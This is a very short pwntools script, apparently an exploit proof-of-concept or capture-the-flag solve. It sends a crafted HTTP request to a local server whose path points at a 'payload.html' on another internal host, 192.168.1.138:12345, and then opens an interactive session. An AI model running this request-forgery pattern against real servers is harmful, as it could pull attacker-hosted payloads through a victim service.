from pwn import *

r = remote('localhost', 8080)
r.send('GET /192.168.1.138:12345/payload.html HTTP/1.1\r\n')
r.send('Host: 127.0.0.1:8080\r\n')
r.send('\r\n')

r.interactive()

